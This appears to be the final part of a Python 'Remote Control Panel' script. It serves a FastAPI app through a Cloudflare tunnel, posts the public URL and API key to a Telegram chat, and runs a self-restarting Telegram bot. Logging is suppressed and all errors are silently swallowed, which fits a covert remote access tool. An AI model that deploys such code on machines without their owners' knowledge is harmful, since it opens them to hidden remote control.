def cleanup_telegram_webhook():
    """Clean up Telegram webhook with retry"""
    for attempt in range(3):
        try:
            url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/deleteWebhook"
            requests.post(url, json={"drop_pending_updates": True}, timeout=10)
            time.sleep(2)
            return
        except:
            if attempt < 2:
                time.sleep(5)
            continue

def send_startup_notification(public_url: str):
    """Send startup notification with retry"""
    time.sleep(3)
    
    for attempt in range(5):
        try:
            if not NetworkUtils.check_internet():
                time.sleep(10)
                continue
            
            url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage"
            data = {
                "chat_id": config.CHAT_ID,
                "text": (
                    f"🟢 Remote Control Panel Online\n\n"
                    f"🔗 URL: {public_url}\n"
                    f"🔑 API Key: {config.API_KEY}\n\n"
                    f"⚠️ Keep this key private!"
                )
            }
            response = requests.post(url, json=data, timeout=10)
            
            if response.status_code == 200:
                return
        except:
            pass
        
        if attempt < 4:
            time.sleep(15)

def wait_for_server(max_attempts: int = 20) -> bool:
    for attempt in range(1, max_attempts + 1):
        try:
            response = requests.get(
                f"http://localhost:{config.WEB_PORT}", 
                timeout=1,
                headers={"User-Agent": "HealthCheck"}
            )
            if response.status_code == 200:
                return True
        except:
            pass
        time.sleep(0.5)
    return False

# ============================================================================
# MAIN WITH RETRY LOGIC
# ============================================================================

def main():
    lock_socket = None
    try:
        lock_socket = check_single_instance()
        executor.ensure_temp_dir()
        
        # Wait for internet connection at startup
        if not NetworkUtils.check_internet():
            NetworkUtils.wait_for_internet(max_wait=300)
        
        fastapi_started = threading.Event()
        
        def run_fastapi():
            try:
                server = uvicorn.Server(
                    uvicorn.Config(
                        app=app,
                        host=config.WEB_HOST,
                        port=config.WEB_PORT,
                        log_level="critical",
                        access_log=False,
                        log_config=None,
                    )
                )
                fastapi_started.set()
                server.run()
            except:
                fastapi_started.set()
        
        fastapi_thread = threading.Thread(target=run_fastapi, daemon=True, name="FastAPI")
        fastapi_thread.start()
        
        fastapi_started.wait(timeout=5)
        time.sleep(1)
        
        if wait_for_server(max_attempts=15):
            pass
        else:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex(('localhost', config.WEB_PORT))
                sock.close()
            except:
                pass
        
        # Setup Cloudflare tunnel with retry
        public_url, cf_proc = CloudflareTunnel.setup_with_retry()
        
        if not public_url:
            public_url = f"LOCAL: http://localhost:{config.WEB_PORT}"
        
        # Send startup notification in background with retry
        threading.Thread(
            target=send_startup_notification,
            args=(public_url,),
            daemon=True
        ).start()
        
        # Build and run Telegram bot with retry
        bot = TelegramBot.build_application_with_retry()
        
        if bot:
            # Monitor and restart bot if connection is lost
            while True:
                try:
                    bot.run_polling(drop_pending_updates=True)
                except Exception:
                    # Wait for internet before retrying
                    if not NetworkUtils.check_internet():
                        NetworkUtils.wait_for_internet(max_wait=180)
                    
                    time.sleep(config.RETRY_DELAY)
                    
                    # Try to rebuild bot application
                    bot = TelegramBot.build_application_with_retry()
                    if not bot:
                        time.sleep(config.RETRY_DELAY)
        
    except KeyboardInterrupt:
        pass
    except:
        pass
    finally:
        if lock_socket:
            try:
                lock_socket.close()
            except:
                pass

if __name__ == "__main__":
    main()